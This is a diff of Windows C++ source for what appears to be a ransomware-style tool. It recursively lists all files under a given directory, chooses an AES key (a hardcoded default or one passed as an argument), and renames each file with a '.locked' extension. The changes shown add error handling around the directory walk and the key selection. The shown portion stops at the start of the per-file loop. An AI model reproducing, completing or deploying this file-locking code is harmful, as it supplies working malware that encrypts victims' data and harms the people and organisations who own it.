@@ -7,7 +7,7 @@
 
 using namespace std;
 
-void FindFile(const std::wstring &directory, wstring ext, queue<wstring> &results)
+BOOL FindFile(const std::wstring &directory, wstring ext, queue<wstring> &results, DWORD& errCode)
 {
     // only local files - \\*
     std::wstring tmp = directory + L"\\*";
@@ -40,11 +40,15 @@ void FindFile(const std::wstring &directory, wstring ext, queue<wstring> &result
         FindClose(search_handle);
 
         for (std::vector<std::wstring>::iterator iter = directories.begin(), end = directories.end(); iter != end; ++iter)
-            FindFile(*iter, ext, results);
+            FindFile(*iter, ext, results, errCode);
+        return TRUE;
+    } else {
+        errCode = GetLastError();
+        return FALSE;
     }
 }
 
-int wmain(int argc, wchar_t* argv[])
+int wmain(int argc, wchar_t** argv)
 {
     auto printNice = [](const wchar_t* s) {
         wcout << "[*] " << s << endl;
@@ -62,20 +66,21 @@ int wmain(int argc, wchar_t* argv[])
         return 0;
     }
 
-    cout << argc << endl; 
-    auto aeskey = L"3igcZhRdWq96m3GUmTAiv9";
-    if (argc == 3) {
-        printNice(L"using custom key ...");
-        aeskey = argv[2];
-    }
-
     const wchar_t* directoryPath = argv[1];
-
+    
+    wcout << "dir path: " << directoryPath << endl;
     queue<wstring> results;
-    FindFile(directoryPath, L"", results);
+
+    DWORD errCode = 0;
+    if (FindFile(directoryPath, L"", results, errCode) != TRUE) {
+        printNice(L"Some problem with the path provided ...");
+        return 1;
+    }
 
     wstring(fileName);
     wstring(newFileName);
+
+    auto aeskey = (argc == 3 ? argv[2] : L"3igcZhRdWq96m3GUmTAiv9");
     while (results.size()) {
         fileName = results.front();
         newFileName = (fileName + L".locked");
